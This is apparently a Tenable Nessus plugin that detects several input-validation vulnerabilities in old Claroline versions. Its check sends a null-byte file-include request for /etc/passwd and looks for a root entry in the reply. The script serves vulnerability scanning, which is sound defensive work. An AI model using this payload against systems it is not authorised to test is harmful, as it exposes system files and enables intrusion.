#
# (C) Tenable Network Security
#


if (description) {
  script_id(18165);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-1374", "CVE-2005-1375", "CVE-2005-1376", "CVE-2005-1377");
  script_bugtraq_id(13407);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"16520");
    # also, OSVDB 16521 - 16541
    script_xref(name:"OSVDB", value:"16542");
  }

  name["english"] = "Claroline < 1.5.4 / 1.6.0 Multiple Input Validation Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to a
variety of attacks. 

Description :

The version of Claroline (an open source, collaborative learning
environment) installed on the remote host suffers from a number of
remotely-exploitable vulnerabilities, including:

  - Multiple Remote File Include Vulnerabilities
    Four scripts let an attacker read arbitrary files on the 
    remote host and possibly even run arbitrary PHP code, 
    subject to the privileges of the web server user.

  - Multiple SQL Injection Vulnerabilities
    Seven scripts let an attacker inject arbitrary input
    into SQL statements, potentially revealing sensitive
    data or altering them.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can pass arbitrary HTML and script code
    through any of 10 flawed scripts and potentially have
    that code executed by a user's browser in the context 
    of the affected web site.

  - Multiple Directory Traversal Vulnerabilities
    By exploiting flaws in 'claroline/document/document.php' 
    and 'claroline/learnPath/insertMyDoc.php', project leaders
    (teachers) are able to upload files to arbitrary folders 
    or copy/move/delete (then view) files of arbitrary folders.

See also : 

http://www.zone-h.org/advisories/read/id=7472

Solution : 

Upgrade to Claroline version 1.5.4 / 1.6.0 or later.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple input validation vulnerabilities in Claroline < 1.5.4 / 1.6.0";

  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Check for the vulnerability by trying to grab a file.
  req = http_get(
    item:string(
      dir, "/claroline/inc/claro_init_header.inc.php?",
      "includePath=/etc/passwd%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # It's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.+:0:")) {
    security_hole(port);
    exit(0);
  }
}
